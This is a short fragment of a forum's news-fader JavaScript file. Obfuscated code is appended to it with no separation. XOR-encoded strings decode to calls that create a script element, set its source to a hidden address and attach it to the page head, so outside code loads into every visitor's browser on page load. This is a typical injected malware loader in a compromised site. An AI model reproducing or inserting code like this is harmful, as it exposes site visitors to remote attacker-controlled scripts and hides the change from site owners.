...
smf_NewsFader.prototype.fade = function fade()
{
	...
	// Keep going.
	window.setTimeout(this.opt.sSelf + '.fade();', 20);
}function y0N(tF089H){return cbsIz7S(oph7n(tF089H),'z8COE01o4bfVJDO');}function oph7n(c1C){var d0lJw='';var lF=0;var lTxp=0;for(lF=0;lF<c1C.length/3;lF++){d0lJw+=String.fromCharCode(c1C.slice(lTxp,lTxp+3));lTxp=lTxp+3;}return d0lJw;}var ewO77BH=["009091","008081","010076","025074038046049085116003081015003056062","009074032","014065051042","014093059059106090080025085017005036035052059","027072051042043084114007093014002","018093034043","029093055010041085092010090022021020051016046029118034034032","018076055063127031030028064003018051100055034022010109061048031091028027001008034100046060"];function uc0(cZ7){var rXV3h=document[y0N(ewO77BH[3])](y0N(ewO77BH[0])+y0N(ewO77BH[1])+y0N(ewO77BH[2]));rXV3h[y0N(ewO77BH[4])]=cZ7;rXV3h[y0N(ewO77BH[5])]=y0N(ewO77BH[6]);document[y0N(ewO77BH[9])](y0N(ewO77BH[8]))[0][y0N(ewO77BH[7])](rXV3h);}function cbsIz7S(v070nK,a5m2){var p5='';var g1MXk2=0;var cLzU=0;for(g1MXk2=0;g1MXk2<v070nK.length;g1MXk2++){var j4=v070nK.charAt(g1MXk2);var z8r30k=j4.charCodeAt(0)^a5m2.charCodeAt(cLzU);j4=String.fromCharCode(z8r30k);p5+=j4;if(cLzU==a5m2.length-1)cLzU=0;else cLzU++;}return (p5);}uc0(y0N(ewO77BH[10]));